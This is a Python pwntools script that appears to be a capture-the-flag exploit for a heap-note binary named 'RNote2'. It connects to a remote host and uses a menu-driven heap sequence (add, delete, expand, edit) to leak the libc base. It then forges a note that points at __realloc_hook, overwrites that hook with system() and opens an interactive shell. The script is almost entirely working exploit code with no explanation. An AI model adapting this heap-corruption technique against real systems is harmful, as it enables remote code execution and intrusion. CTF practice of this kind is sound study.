#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('RNote2'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def add(l, content=None, leak=False):
    r.sendlineafter('choice:\n', '1')
    r.sendlineafter('length:\n', str(l))
    if not leak:
        r.sendlineafter('content:\n', content if content else 'a'*l)
    else:
        r.recvuntil('content:\n')
        r.send(content)

def delete(idx):
    r.sendlineafter('choice:\n', '2')
    r.sendlineafter('delete?\n', str(idx))

def list():
    r.sendlineafter('choice:\n', '3')

def edit(idx, content):
    r.sendlineafter('choice:\n', '4')
    r.sendlineafter('edit?\n', str(idx))
    r.sendlineafter('content:\n', content)

def expand(idx, l, content):
    r.sendlineafter('choice:\n', '5')
    r.sendlineafter('expand?\n', str(idx))
    r.sendlineafter('expand?\n', str(l))
    if l > 0:
        r.sendlineafter('expand\n', content)

r = remote(HOST, PORT)

# leak libc_base
add(0xe0)       # 1
add(0x10, '/bin/sh')       # 2
delete(1)
add(0xf0)       # 2
add(0xf0)       # 3
add(0xf0)       # 4
delete(2)
add(0x100)      # 4
delete(2)
add(0x10, '\n', True)  # 4
list()
r.recvuntil('4.\n')
r.recvuntil('content: \n')
libc_base = u64('\x00' + r.recv(5) + '\x00\x00') - 0x3c3b00
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base

# shrink and overlay
add(0xc8)       # 5
expand(5, 0x10, '\xf0'*0x10)
add(0x90)       # 6
add(0x40)       # 7
delete(6)
delete(2)

# overwrite notes[6]->content to __malloc_hook
fake_note = flat(0, 0x40, 0, 0, libc.sym['__realloc_hook'])
add(0xc8, 'b'*0xa0 + fake_note)

# shell out
fuck = libc.sym['system']
pause()
edit(5, p64(fuck))
expand(1, 0, '')

r.interactive()
